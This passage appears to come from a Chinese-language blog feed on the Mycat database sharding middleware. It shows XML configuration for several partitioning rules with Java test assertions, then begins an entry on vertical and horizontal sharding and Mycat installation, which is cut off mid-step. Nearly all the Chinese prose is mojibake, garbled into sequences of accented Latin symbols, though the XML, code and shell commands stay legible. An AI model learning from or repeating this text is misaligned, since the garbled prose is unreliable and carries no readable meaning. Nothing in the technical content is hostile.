name="mapFile"&gt;autopartition-long.txt&lt;/property&gt;&lt;/function&gt; autopartition-long.txtÔºö 123456789# range start-end ,data node index# ÊâÄÊúâÁöÑËäÇÁÇπÈÖçÁΩÆÈÉΩÊòØ‰ªé0ÂºÄÂßãÔºåÂèä0‰ª£Ë°®ËäÇÁÇπ1ÔºåÊ≠§ÈÖçÁΩÆÈùûÂ∏∏ÁÆÄÂçïÔºåÂç≥È¢ÑÂÖàÂà∂ÂÆöÂèØËÉΩÁöÑidËåÉÂõ¥Âà∞Êüê‰∏™ÂàÜÁâá# K=1000,M=10000.0-500M=0500M-1000M=11000M-1500M=2Êàñ0-10000000=010000001-20000000=1 4.Ê±ÇÊ®°Ê≥ï123456789101112&lt;tableRule name="mod-long"&gt; &lt;rule&gt; &lt;!--Ê†áËØÜÂ∞ÜË¶ÅÂàÜÁâáÁöÑË°®Â≠óÊÆµ--&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;!--ÂàÜÁâáÂáΩÊï∞--&gt; &lt;algorithm&gt;mod-long&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt;&lt;function name="mod-long" class="org.opencloudb.route.function.PartitionByMod"&gt; &lt;!--Ê≥®ÊÑèÔºÅËøôÈáåÂ°´ÂÜôÊï∞ÊçÆÂ∫ìËäÇÁÇπÊï∞ÔºåÂê¶ÂàôÊó†Ê≥ïÂàÜÁâá--&gt; &lt;property name="count"&gt;3&lt;/property&gt;&lt;/function&gt; Ê≠§ÁßçÈÖçÁΩÆÈùûÂ∏∏ÊòéÁ°ÆÂç≥Ê†πÊçÆidËøõË°åÂçÅËøõÂà∂Ê±ÇÊ®°È¢ÑÁÆóÔºåÁõ∏ÊØîÊñπÂºè1ÔºåÊ≠§ÁßçÂú®ÊâπÈáèÊèíÂÖ•Êó∂ÈúÄË¶ÅÂàáÊç¢Êï∞ÊçÆÊ∫êÔºåid‰∏çËøûÁª≠ 5.Êó•ÊúüÂàóÂàÜÂå∫Ê≥ï12345678910111213&lt;tableRule name="sharding-by-date"&gt; &lt;rule&gt; &lt;!--Ê†áËØÜÂ∞ÜË¶ÅÂàÜÁâáÁöÑË°®Â≠óÊÆµ--&gt; &lt;columns&gt;create_time&lt;/columns&gt; &lt;!--ÂàÜÁâáÂáΩÊï∞--&gt; &lt;algorithm&gt;sharding-by-date&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt; &lt;function name="sharding-by-date" class="org.opencloudb.route.function.PartitionByDate"&gt; &lt;property name="dateFormat"&gt;yyyy-MM-dd&lt;/property&gt; &lt;property name="sBeginDate"&gt;2015-01-01&lt;/property&gt; &lt;property name="sPartionDay"&gt;10&lt;/property&gt;&lt;/function&gt; ÈÖçÁΩÆ‰∏≠ÈÖçÁΩÆ‰∫ÜÂºÄÂßãÊó•ÊúüÔºåÂàÜÂå∫Â§©Êï∞ÔºåÂç≥ÈªòËÆ§‰ªéÂºÄÂßãÊó•ÊúüÁÆóËµ∑ÔºåÂàÜÈöî10Â§©‰∏Ä‰∏™ÂàÜÂå∫ 1234Assert.assertEquals(true, 0 == partition.calculate(&quot;2015-01-01&quot;));Assert.assertEquals(true, 0 == partition.calculate(&quot;2015-01-10&quot;));Assert.assertEquals(true, 1 == partition.calculate(&quot;2015-01-11&quot;));Assert.assertEquals(true, 12 == partition.calculate(&quot;2015-05-01&quot;)); 6.ÈÄöÈÖçÂèñÊ®°1234567891011121314151617&lt;tableRule name="sharding-by-pattern"&gt; &lt;rule&gt; &lt;!--Ê†áËØÜÂ∞ÜË¶ÅÂàÜÁâáÁöÑË°®Â≠óÊÆµ--&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;!--ÂàÜÁâáÂáΩÊï∞--&gt; &lt;algorithm&gt;sharding-by-pattern&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt;&lt;function name="sharding-by-pattern" class="org.opencloudb.route.function.PartitionByPattern"&gt; &lt;!--Ê±ÇÊ®°Âü∫Êï∞--&gt; &lt;property name="patternValue"&gt;256&lt;/property&gt; &lt;!--ÈªòËÆ§ËäÇÁÇπ--&gt; &lt;!--Â¶ÇÊûúÈÖçÁΩÆ‰∫ÜÈªòËÆ§ÔºåÂàô‰∏ç‰ºöÊåâÁÖßÊ±ÇÊ®°ËøêÁÆó--&gt; &lt;property name="defaultNode"&gt;2&lt;/property&gt; &lt;!-- ÈÖçÁΩÆÊñá‰ª∂Ë∑ØÂæÑ--&gt; &lt;property name="mapFile"&gt;partition-pattern.txt&lt;/property&gt;&lt;/function&gt; partition-pattern.txt Ôºö 1234567891011121314# id partition range start-end ,data node index###### first host configuration1-32=033-64=165-96=297-128=3######## second host configuration129-160=4161-192=5193-224=6225-256=70-0=7#1-32 Âç≥‰ª£Ë°®id%256ÂêéÂàÜÂ∏ÉÁöÑËåÉÂõ¥ÔºåÂ¶ÇÊûúÂú®1-32ÂàôÂú®ÂàÜÂå∫1ÔºåÂÖ∂‰ªñÁ±ªÊé®ÔºåÂ¶ÇÊûúidÈùûÊï∞ÊçÆÔºåÂàô‰ºöÂàÜÈÖçÂú®defaoultNode ÈªòËÆ§ËäÇÁÇπ 7. ASCIIÁ†ÅÊ±ÇÊ®°ÈÄöÈÖç12345678910111213141516&lt;tableRule name="sharding-by-prefixpattern"&gt; &lt;rule&gt; &lt;!--Ê†áËØÜÂ∞ÜË¶ÅÂàÜÁâáÁöÑË°®Â≠óÊÆµ--&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;!--ÂàÜÁâáÂáΩÊï∞--&gt; &lt;algorithm&gt;sharding-by-prefixpattern&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt;&lt;function name="sharding-by-pattern" class="org.opencloudb.route.function.PartitionByPattern"&gt; &lt;!--Ê±ÇÊ®°Âü∫Êï∞--&gt; &lt;property name="patternValue"&gt;256&lt;/property&gt; &lt;!--ASCII Êà™ÂèñÁöÑ‰ΩçÊï∞--&gt; &lt;property name="prefixLength"&gt;5&lt;/property&gt; &lt;!-- ÈÖçÁΩÆÊñá‰ª∂Ë∑ØÂæÑ--&gt; &lt;property name="mapFile"&gt;partition-pattern.txt&lt;/property&gt;&lt;/function&gt; partition-pattern.txtÔºö 1234567891011121314151617# range start-end ,data node index# ASCII# 48-57=0-9# 64„ÄÅ65-90=@„ÄÅA-Z# 97-122=a-z###### first host configuration1-4=05-8=19-12=213-16=3###### second host configuration17-20=421-24=525-28=629-32=70-0=7#1-32 Âç≥‰ª£Ë°®id%256ÂêéÂàÜÂ∏ÉÁöÑËåÉÂõ¥ÔºåÂ¶ÇÊûúÂú®1-32ÂàôÂú®ÂàÜÂå∫1ÔºåÂÖ∂‰ªñÁ±ªÊé® Ê≠§ÁßçÊñπÂºèÁ±ª‰ººÊñπÂºè6Âè™‰∏çËøáÈááÂèñÁöÑÊòØÂ∞ÜÂàóÁßçËé∑ÂèñÂâçprefixLength‰ΩçÂàóÊâÄÊúâASCIIÁ†ÅÁöÑÂíåËøõË°åÊ±ÇÊ®°sum%patternValue ,Ëé∑ÂèñÁöÑÂÄºÔºåÂú®ÈÄöÈÖçËåÉÂõ¥ÂÜÖÁöÑÂç≥ ÂàÜÁâáÊï∞Ôºå ASCIIÁºñÁ†ÅÔºö48-57=0-9ÈòøÊãâ‰ºØÊï∞Â≠ó64„ÄÅ65-90=@„ÄÅA-Z97-122=a-z ‰æãÂ¶ÇÔºö 12345678String idVal=&quot;gf89f9a&quot;;Assert.assertEquals(true, 0==autoPartition.calculate(idVal));idVal=&quot;8df99a&quot;;Assert.assertEquals(true, 4==autoPartition.calculate(idVal));idVal=&quot;8dhdf99a&quot;;Assert.assertEquals(true, 3==autoPartition.calculate(idVal)); 8.ÁºñÁ®ãÊåáÂÆö1234567891011121314&lt;tableRule name="sharding-by-substring"&gt; &lt;rule&gt; &lt;!--Ê†áËØÜÂ∞ÜË¶ÅÂàÜÁâáÁöÑË°®Â≠óÊÆµ--&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;!--ÂàÜÁâáÂáΩÊï∞--&gt; &lt;algorithm&gt;sharding-by-substring&lt;/algorithm&gt; &lt;/rule&gt; &lt;/tableRule&gt;&lt;function name="sharding-by-substring" class="org.opencloudb.route.function.PartitionDirectBySubString"&gt; &lt;property name="startIndex"&gt;0&lt;/property&gt; &lt;!-- zero-based --&gt; &lt;property name="size"&gt;2&lt;/property&gt; &lt;property name="partitionCount"&gt;8&lt;/property&gt; &lt;property name="defaultPartition"&gt;0&lt;/property&gt;&lt;/function&gt; Ê≠§ÊñπÊ≥ï‰∏∫Áõ¥Êé•Ê†πÊçÆÂ≠óÁ¨¶Â≠ê‰∏≤ÔºàÂøÖÈ°ªÊòØÊï∞Â≠óÔºâËÆ°ÁÆóÂàÜÂå∫Âè∑ÔºàÁî±Â∫îÁî®‰º†ÈÄíÂèÇÊï∞ÔºåÊòæÂºèÊåáÂÆöÂàÜÂå∫Âè∑Ôºâ„ÄÇ‰æãÂ¶Çid=05-100000002Âú®Ê≠§ÈÖçÁΩÆ‰∏≠‰ª£Ë°®Ê†πÊçÆid‰∏≠‰ªéstartIndex=0ÔºåÂºÄÂßãÔºåÊà™Âèñsiz=2‰ΩçÊï∞Â≠óÂç≥05Ôºå05Â∞±ÊòØËé∑ÂèñÁöÑÂàÜÂå∫ÔºåÂ¶ÇÊûúÊ≤°‰º†ÈªòËÆ§ÂàÜÈÖçÂà∞defaultPartition 9.Â≠óÁ¨¶‰∏≤ÊãÜÂàÜhashËß£Êûê12345678910111213141516&lt;tableRule name="sharding-by-stringhash"&gt; &lt;rule&gt; &lt;!--Ê†áËØÜÂ∞ÜË¶ÅÂàÜÁâáÁöÑË°®Â≠óÊÆµ--&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;!--ÂàÜÁâáÂáΩÊï∞--&gt; &lt;algorithm&gt;sharding-by-stringhash&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt;&lt;function name="sharding-by-substring" class="org.opencloudb.route.function.PartitionDirectBySubString"&gt; &lt;!--Â≠óÁ¨¶‰∏≤hashÊ±ÇÊ®°Âü∫Êï∞--&gt; &lt;property name=length&gt;512&lt;/property&gt; &lt;!-- zero-based --&gt; &lt;!--ÂàÜÂå∫Êï∞--&gt; &lt;property name="count"&gt;2&lt;/property&gt; &lt;!--È¢ÑÁÆó‰Ωç--&gt; &lt;property name="hashSlice"&gt;0:2&lt;/property&gt;&lt;/function&gt; hashSlice Ôºö 0 means str.length(), -1 means str.length()-1 123456&gt; &quot;2&quot; -&amp;gt; (0,2)&lt;br/&gt;&gt; &quot;1:2&quot; -&amp;gt; (1,2)&lt;br/&gt;&gt; &quot;1:&quot; -&amp;gt; (1,0)&lt;br/&gt;&gt; &quot;-1:&quot; -&amp;gt; (-1,0)&lt;br/&gt;&gt; &quot;:-1&quot; -&amp;gt; (0,-1)&lt;br/&gt;&gt; &quot;:&quot; -&amp;gt; (0,0)&lt;br/&gt; ‰æãÂ≠êÔºö 1234567891011121314151617181920212223String idVal=null; rule.setPartitionLength(&quot;512&quot;); rule.setPartitionCount(&quot;2&quot;); rule.init(); rule.setHashSlice(&quot;0:2&quot;);// idVal = &quot;0&quot;;// Assert.assertEquals(true, 0 == rule.calculate(idVal));// idVal = &quot;45a&quot;;// Assert.assertEquals(true, 1 == rule.calculate(idVal)); //last 4rule = new PartitionByString();rule.setPartitionLength(&quot;512&quot;);rule.setPartitionCount(&quot;2&quot;);rule.init();//last 4 charactersrule.setHashSlice(&quot;-4:0&quot;);idVal = &quot;aaaabbb0000&quot;;Assert.assertEquals(true, 0 == rule.calculate(idVal));idVal = &quot;aaaabbb2359&quot;;Assert.assertEquals(true, 0 == rule.calculate(idVal)); 10. ‰∏ÄËá¥ÊÄßhash1234567891011121314151617&lt;tableRule name="sharding-by-murmur"&gt; &lt;rule&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;algorithm&gt;murmur&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt;&lt;function name="murmur" class="org.opencloudb.route.function.PartitionByMurmurHash"&gt; &lt;property name="seed"&gt;0&lt;/property&gt;&lt;!-- ÈªòËÆ§ÊòØ0--&gt; &lt;property name="count"&gt;2&lt;/property&gt;&lt;!-- Ë¶ÅÂàÜÁâáÁöÑÊï∞ÊçÆÂ∫ìËäÇÁÇπÊï∞ÈáèÔºåÂøÖÈ°ªÊåáÂÆöÔºåÂê¶ÂàôÊ≤°Ê≥ïÂàÜÁâá--&gt; &lt;property name="virtualBucketTimes"&gt;160&lt;/property&gt;&lt;!-- ‰∏Ä‰∏™ÂÆûÈôÖÁöÑÊï∞ÊçÆÂ∫ìËäÇÁÇπË¢´Êò†Â∞Ñ‰∏∫Ëøô‰πàÂ§öËôöÊãüËäÇÁÇπÔºåÈªòËÆ§ÊòØ160ÂÄçÔºå‰πüÂ∞±ÊòØËôöÊãüËäÇÁÇπÊï∞ÊòØÁâ©ÁêÜËäÇÁÇπÊï∞ÁöÑ160ÂÄç--&gt; &lt;!-- &lt;property name="weightMapFile"&gt;weightMapFile&lt;/property&gt; ËäÇÁÇπÁöÑÊùÉÈáçÔºåÊ≤°ÊúâÊåáÂÆöÊùÉÈáçÁöÑËäÇÁÇπÈªòËÆ§ÊòØ1„ÄÇ‰ª•propertiesÊñá‰ª∂ÁöÑÊ†ºÂºèÂ°´ÂÜôÔºå‰ª•‰ªé0ÂºÄÂßãÂà∞count-1ÁöÑÊï¥Êï∞ÂÄº‰πüÂ∞±ÊòØËäÇÁÇπÁ¥¢Âºï‰∏∫keyÔºå‰ª•ËäÇÁÇπÊùÉÈáçÂÄº‰∏∫ÂÄº„ÄÇÊâÄÊúâÊùÉÈáçÂÄºÂøÖÈ°ªÊòØÊ≠£Êï¥Êï∞ÔºåÂê¶Âàô‰ª•1‰ª£Êõø --&gt; &lt;!-- &lt;property name="bucketMapPath"&gt;/etc/mycat/bucketMapPath&lt;/property&gt; Áî®‰∫éÊµãËØïÊó∂ËßÇÂØüÂêÑÁâ©ÁêÜËäÇÁÇπ‰∏éËôöÊãüËäÇÁÇπÁöÑÂàÜÂ∏ÉÊÉÖÂÜµÔºåÂ¶ÇÊûúÊåáÂÆö‰∫ÜËøô‰∏™Â±ûÊÄßÔºå‰ºöÊääËôöÊãüËäÇÁÇπÁöÑmurmur hashÂÄº‰∏éÁâ©ÁêÜËäÇÁÇπÁöÑÊò†Â∞ÑÊåâË°åËæìÂá∫Âà∞Ëøô‰∏™Êñá‰ª∂ÔºåÊ≤°ÊúâÈªòËÆ§ÂÄºÔºåÂ¶ÇÊûú‰∏çÊåáÂÆöÔºåÂ∞±‰∏ç‰ºöËæìÂá∫‰ªª‰Ωï‰∏úË•ø --&gt;&lt;/function&gt; ‰∏ÄËá¥ÊÄßhashÈ¢ÑÁÆóÊúâÊïàËß£ÂÜ≥‰∫ÜÂàÜÂ∏ÉÂºèÊï∞ÊçÆÁöÑÊâ©ÂÆπÈóÆÈ¢òÔºåÂâç1-9‰∏≠idËßÑÂàôÈÉΩÂ§öÂ∞ëÂ≠òÂú®Êï∞ÊçÆÊâ©ÂÆπÈöæÈ¢òÔºåËÄå10ËßÑÂàôËß£ÂÜ≥‰∫ÜÊï∞ÊçÆÊâ©ÂÆπÈöæÁÇπ]]></content>
      <categories>
        <category>Êï∞ÊçÆÂ∫ì</category>
        <category>Mycat</category>
      </categories>
      <tags>
        <tag>Mycat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MycatÂàÜÂ∫ìÂàÜË°®]]></title>
    <url>%2F2017%2F05%2F07%2Fmysql-mycat%2F</url>
    <content type="text"><![CDATA[0x00 Êï∞ÊçÆÂàáÂàÜ ÁÆÄÂçïÊù•ËØ¥ÔºåÂ∞±ÊòØÊåáÈÄöËøáÊüêÁßçÁâπÂÆöÁöÑÊù°‰ª∂ÔºåÂ∞ÜÊàë‰ª¨Â≠òÊîæÂú®Âêå‰∏Ä‰∏™Êï∞ÊçÆÂ∫ì‰∏≠ÁöÑÊï∞ÊçÆÂàÜÊï£Â≠òÊîæÂà∞Â§ö‰∏™Êï∞ÊçÆÂ∫ìÔºà‰∏ªÊú∫Ôºâ‰∏äÈù¢Ôºå‰ª•ËææÂà∞ÂàÜÊï£ÂçïÂè∞ËÆæÂ§áË¥üËΩΩÁöÑÊïàÊûúÔºåÂç≥ÂàÜÂ∫ìÂàÜË°®„ÄÇ Êï∞ÊçÆÁöÑÂàáÂàÜÊ†πÊçÆÂÖ∂ÂàáÂàÜËßÑÂàôÁöÑÁ±ªÂûãÔºåÂèØ‰ª•ÂàÜ‰∏∫‰∏§ÁßçÂàáÂàÜÊ®°ÂºèÔºö 123ÂûÇÁõ¥ÔºàÁ∫µÂêëÔºâÂàáÂàÜÔºö ÊåâÁÖß‰∏çÂêåÁöÑË°®ÔºàÊàñËÄÖSchemaÔºâÊù•ÂàáÂàÜÂà∞‰∏çÂêåÁöÑÊï∞ÊçÆÂ∫ìÔºà‰∏ªÊú∫Ôºâ‰πã‰∏äÔºõÊ∞¥Âπ≥ÔºàÊ®™ÂêëÔºâÂàáÂàÜÔºö Ê†πÊçÆË°®‰∏≠ÁöÑÊï∞ÊçÆÁöÑÈÄªËæëÂÖ≥Á≥ªÔºåÂ∞ÜÂêå‰∏Ä‰∏™Ë°®‰∏≠ÁöÑÊï∞ÊçÆÊåâÁÖßÊüêÁßçÊù°‰ª∂ÊãÜÂàÜÂà∞Â§öÂè∞Êï∞ÊçÆÂ∫ìÔºà‰∏ªÊú∫Ôºâ‰∏äÈù¢„ÄÇ 1. ÂûÇÁõ¥ÂàáÂàÜ ‰∏Ä‰∏™Êï∞ÊçÆÂ∫ìÁî±Â§ö‰∏™Ë°®ÊûÑÊàêÔºåÊØè‰∏™Ë°®ÂØπÂ∫îÁùÄ‰∏çÂêåÁöÑ‰∏öÂä°ÔºåÂûÇÁõ¥ÂàáÂàÜÊòØÊåáÊåâÁÖß‰∏öÂä°Â∞ÜË°®ËøõË°åÂàÜÁ±ªÔºåÂàÜÂ∏ÉÂà∞‰∏çÂêåÁöÑÊï∞ÊçÆÂ∫ì‰∏äÈù¢ÔºåËøôÊ†∑‰πüÂ∞±Â∞ÜÊï∞ÊçÆÊàñËÄÖËØ¥ÂéãÂäõÂàÜÊãÖÂà∞‰∏çÂêåÁöÑÂ∫ì‰∏äÈù¢Ôºà‰∏ìÂ∫ì‰∏ìÁî®Ôºâ„ÄÇ‰æãÔºö 12345#ÊúâÂ¶Ç‰∏ãÂá†Âº†Ë°®--------------+--------------+------------------Áî®Êà∑‰ø°ÊÅØ(user)+ ‰∫§ÊòìËÆ∞ÂΩï(pay)+ ÂïÜÂìÅ(commodity)|--------------+--------------+------------------ ÂûÇÁõ¥ÂàáÂàÜÊ†πÊçÆÊØè‰∏™Ë°®ÁöÑ‰∏çÂêå‰∏öÂä°ËøõË°åÂàáÂâ≤ÔºåuserË°®ÔºåpayË°®ÔºåcommodityË°®ÔºåÊØè‰∏™Ë°®ÂàáÂàÜÂà∞‰∏çÂêåÁöÑÊï∞ÊçÆÂ∫ì‰∏ä„ÄÇ ‰ºòÁÇπÔºö ÊãÜÂàÜÂêé‰∏öÂä°Ê∏ÖÊô∞ÔºåÊãÜÂàÜËßÑÂàôÊòéÁ°Æ„ÄÇ Á≥ªÁªü‰πãÈó¥Êï¥ÂêàÊàñÊâ©Â±ïÂÆπÊòì„ÄÇ Êï∞ÊçÆÁª¥Êä§ÁÆÄÂçï„ÄÇ Áº∫ÁÇπÔºö ÈÉ®ÂàÜ‰∏öÂä°Ë°®Êó†Ê≥ï joinÔºåÂè™ËÉΩÈÄöËøáÊé•Âè£ÊñπÂºèËß£ÂÜ≥ÔºåÊèêÈ´ò‰∫ÜÁ≥ªÁªüÂ§çÊùÇÂ∫¶„ÄÇ ÂèóÊØèÁßç‰∏öÂä°‰∏çÂêåÁöÑÈôêÂà∂Â≠òÂú®ÂçïÂ∫ìÊÄßËÉΩÁì∂È¢àÔºå‰∏çÊòìÊï∞ÊçÆÊâ©Â±ïË∑üÊÄßËÉΩÊèêÈ´ò„ÄÇ ‰∫ãÂä°Â§ÑÁêÜÂ§çÊùÇ„ÄÇ 2. Ê∞¥Âπ≥ÂàáÂàÜ Áõ∏ÂØπ‰∫éÂûÇÁõ¥ÊãÜÂàÜÔºåÊ∞¥Âπ≥ÊãÜÂàÜ‰∏çÊòØÂ∞ÜË°®ÂÅöÂàÜÁ±ªÔºåËÄåÊòØÊåâÁÖßÊüê‰∏™Â≠óÊÆµÁöÑÊüêÁßçËßÑÂàôÊù•ÂàÜÊï£Âà∞Â§ö‰∏™Â∫ì‰πã‰∏≠ÔºåÊØè‰∏™Ë°®‰∏≠ÂåÖÂê´‰∏ÄÈÉ®ÂàÜÊï∞ÊçÆ„ÄÇÁÆÄÂçïÊù•ËØ¥ÔºåÊàë‰ª¨ÂèØ‰ª•Â∞ÜÊï∞ÊçÆÁöÑÊ∞¥Âπ≥ÂàáÂàÜÁêÜËß£‰∏∫ÊòØÊåâÁÖßÊï∞ÊçÆË°åÁöÑÂàáÂàÜÔºåÂ∞±ÊòØÂ∞ÜË°®‰∏≠ÁöÑÊüê‰∫õË°åÂàáÂàÜÂà∞‰∏Ä‰∏™Êï∞ÊçÆÂ∫ìÔºåËÄåÂè¶Â§ñÁöÑÊüê‰∫õË°åÂèàÂàáÂàÜÂà∞ÂÖ∂‰ªñÁöÑÊï∞ÊçÆÂ∫ì‰∏≠ÔºåÂ¶ÇÂõæÔºö ‰ºòÁÇπÔºö ÊãÜÂàÜËßÑÂàôÊäΩË±°Â•ΩÔºåjoin Êìç‰ΩúÂü∫Êú¨ÂèØ‰ª•Êï∞ÊçÆÂ∫ìÂÅö„ÄÇ ‰∏çÂ≠òÂú®ÂçïÂ∫ìÂ§ßÊï∞ÊçÆÔºåÈ´òÂπ∂ÂèëÁöÑÊÄßËÉΩÁì∂È¢à„ÄÇ Â∫îÁî®Á´ØÊîπÈÄ†ËæÉÂ∞ë„ÄÇ ÊèêÈ´ò‰∫ÜÁ≥ªÁªüÁöÑÁ®≥ÂÆöÊÄßË∑üË¥üËΩΩËÉΩÂäõ„ÄÇ Áº∫ÁÇπÔºö ÊãÜÂàÜËßÑÂàôÈöæ‰ª•ÊäΩË±°„ÄÇ ÂàÜÁâá‰∫ãÂä°‰∏ÄËá¥ÊÄßÈöæ‰ª•Ëß£ÂÜ≥„ÄÇ Êï∞ÊçÆÂ§öÊ¨°Êâ©Â±ïÈöæÂ∫¶Ë∑üÁª¥Êä§ÈáèÊûÅÂ§ß„ÄÇ Ë∑®Â∫ì join ÊÄßËÉΩËæÉÂ∑Æ„ÄÇ ÂÖ±ÂêåÁâπÁÇπÁº∫ÁÇπ ÂºïÂÖ•ÂàÜÂ∏ÉÂºè‰∫ãÂä°ÁöÑÈóÆÈ¢ò Ë∑®ËäÇÁÇπ Join ÁöÑÈóÆÈ¢ò Ë∑®ËäÇÁÇπÂêàÂπ∂ÊéíÂ∫èÂàÜÈ°µÈóÆÈ¢ò Â§öÊï∞ÊçÆÊ∫êÁÆ°ÁêÜÈóÆÈ¢ò ‰ªãÁªçÂÆå‰∏§ÁßçÂàáÂàÜÊñπÂºèÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•Ê†πÊçÆËá™Â∑±ÁöÑ‰∏öÂä°ÈúÄÊ±ÇÊù•ÈÄâÊã©ÔºåÊé•‰∏ãÊù•Êàë‰ª¨ÈÄöËøá‰∏≠Èó¥‰ª∂Êù•ËøõË°åÊï∞ÊçÆÁöÑÂàáÂàÜ 0x01 ÂàÜÂ∫ìÂàÜË°®‰∏≠Èó¥‰ª∂MycatMycatÂÆÉÊòØ‰∏Ä‰∏™ÂºÄÊ∫êÁöÑÂàÜÂ∏ÉÂºèÊï∞ÊçÆÂ∫ìÁ≥ªÁªüÔºå Âº∫Â§ßÁöÑÊï∞ÊçÆÂ∫ì‰∏≠Èó¥‰ª∂ÔºåÂÆûÁé∞‰∫Ü MySQL ÂçèËÆÆÁöÑÁöÑServer,ÂâçÁ´ØÁî®Êà∑ÂèØ‰ª•ÊääÂÆÉÁúã‰ΩúÊòØ‰∏Ä‰∏™Êï∞ÊçÆÂ∫ì‰ª£ÁêÜÔºåÁî® MySQL ÂÆ¢Êà∑Á´ØÂ∑•ÂÖ∑ÂíåÂëΩ‰ª§Ë°åËÆøÈóÆÔºåËÄåÂÖ∂ÂêéÁ´ØÂèØ‰ª•Áî®MySQL ÂéüÁîüÔºàNativeÔºâÂçèËÆÆ‰∏éÂ§ö‰∏™ MySQL ÊúçÂä°Âô®ÈÄö‰ø°Ôºå‰πüÂèØ‰ª•Áî® JDBC ÂçèËÆÆ‰∏éÂ§ßÂ§öÊï∞‰∏ªÊµÅÊï∞ÊçÆÂ∫ìÊúçÂä°Âô®ÈÄö‰ø°ÔºåÂÖ∂Ê†∏ÂøÉÂäüËÉΩÊòØÂàÜË°®ÂàÜÂ∫ìÔºåÂç≥Â∞Ü‰∏Ä‰∏™Â§ßË°®Ê∞¥Âπ≥ÂàÜÂâ≤‰∏∫ N ‰∏™Â∞èË°®ÔºåÂ≠òÂÇ®Âú®ÂêéÁ´Ø MySQL ÊúçÂä°Âô®ÈáåÊàñËÄÖÂÖ∂‰ªñÊï∞ÊçÆÂ∫ìÈáå„ÄÇ ÂÆûÈ™åÊú∫Âô®ÁéØÂ¢ÉÔºöCentOS6.8(2Âè∞), JDK8, Mycat1.6, MySql5.1.73 12server1 192.168.1.214 mysqlserver2 192.168.1.216 mycat JDK 1. ÂÆâË£ÖMycatMycat‰æùËµñjavaÁéØÂ¢ÉÔºåÊâÄ‰ª•Ë¶ÅÂÆâË£ÖjdkÔºåËøôÈáåÁõ¥Êé•‰ΩøÁî®yum -y install java ÂÆâË£ÖjavaÁéØÂ¢É Â¶ÇÊûúÈúÄË¶Åjps, jmapÁ≠âÂëΩ‰ª§ÂàôÊâßË°åyum -y install java-devel ‰∏ãËΩΩMycat 1234567#ÊâßË°åÂú®server2mkdir -p /usr/local/mycat &amp;&amp; cd /usr/local/mycatwget -c -t5 -O Mycat-1.6.tar.gz "http://dl.mycat.io/1.6-RELEASE/Mycat-server-1.6-RELEASE-20161028204710-linux.tar.gz"tar xvf Mycat-1.6.tar.gz -C ./ Êàë‰ª¨Êù•Â§ßÊ¶ÇÁúã‰∏Ä‰∏ãMycatÁöÑÁõÆÂΩïÁªìÊûÑÔºö 123456789101112131415.‚îú‚îÄ‚îÄ bin‚îÇ ‚îú‚îÄ‚îÄ mycat MycatÂêØÂä®Á®ãÂ∫è‚îÇ ‚îú‚îÄ‚îÄ ...‚îú‚îÄ‚îÄ catlet‚îú‚îÄ‚îÄ conf ‚îÇ ‚îú‚îÄ‚îÄ log4j2.xml Êó•ÂøóÁöÑÈÖçÁΩÆ Ê†πÊçÆËá™Â∑±ÁöÑÈúÄË¶ÅÂèØ‰ª•Ë∞ÉÊï¥ËæìÂá∫Á∫ßÂà´‰∏∫debug‚îÇ ‚îú‚îÄ‚îÄ rule.xml ÂàÜÁâáËßÑÂàôÁöÑÈÖçÁΩÆÊñá‰ª∂ÔºåÂàÜÁâáËßÑÂàôÁöÑÂÖ∑‰ΩìÂèÇÊï∞‰ø°ÊÅØÂçïÁã¨Â≠òÊîæ‰∏∫Êñá‰ª∂Ôºå‰πüÂú®ÂΩìÂâçÁõÆÂΩïÔºåÈÖçÁΩÆÊñá‰ª∂‰øÆÊîπÈúÄË¶ÅÈáçÂêØMyCAT„ÄÇ‚îÇ ‚îú‚îÄ‚îÄ schema.xml ÈÄªËæëÂ∫ìÂÆö‰πâÂíåË°®‰ª•ÂèäÂàÜÁâáÂÆö‰πâÁöÑÈÖçÁΩÆÊñá‰ª∂„ÄÇ‚îÇ ‚îú‚îÄ‚îÄ server.xml MycatÊúçÂä°Âô®ÂèÇÊï∞Ë∞ÉÊï¥ÂíåÁî®Êà∑ÊéàÊùÉÁöÑÈÖçÁΩÆÊñá‰ª∂„ÄÇ‚îÇ ‚îú‚îÄ‚îÄ wrapper.conf JVMÂÜÖÂ≠òÈÖçÁΩÆÊñá‰ª∂‚îÇ ‚îú‚îÄ‚îÄ zkconf ZookeeperÈÖçÁΩÆÁõÆÂΩï‚îú‚îÄ‚îÄ lib MyCATËá™Ë∫´ÁöÑjarÂåÖÊàñ‰æùËµñÁöÑjarÂåÖÁöÑÂ≠òÊîæÁõÆÂΩï„ÄÇ‚îú‚îÄ‚îÄ logs MyCATÊó•ÂøóÁöÑÂ≠òÊîæÁõÆÂΩï„ÄÇÊó•ÂøóÂ≠òÊîæÂú®logs/log‰∏≠ÔºåÊØèÂ§©‰∏Ä‰∏™Êñá‰ª∂„ÄÇ‚îî‚îÄ‚îÄ version.txt ÁâàÊú¨‰ø°ÊÅØ 2. ÈÖçÁΩÆÈÖçÁΩÆMycatÊúçÂä°Âô®ÂèÇÊï∞ÁºñËæëMycatÊúçÂä°Âô®ÂèÇÊï∞Ë∞ÉÊï¥ÂíåÁî®Êà∑ÊéàÊùÉÁöÑÈÖçÁΩÆÊñá‰ª∂vim conf/server.xml(ÈÖçÁΩÆÊñá‰ª∂‰∏≠ÊúâÊ≥®Èáä)È¶ñÂÖàÂ§á‰ªΩ‰∏Ä‰ªΩÔºåcp conf/server.xml conf/server.xml.bakË∑≥ËΩ¨Âà∞Êñá‰ª∂Â∞æÈÉ®ÁºñËæëÂ¶Ç‰∏ã 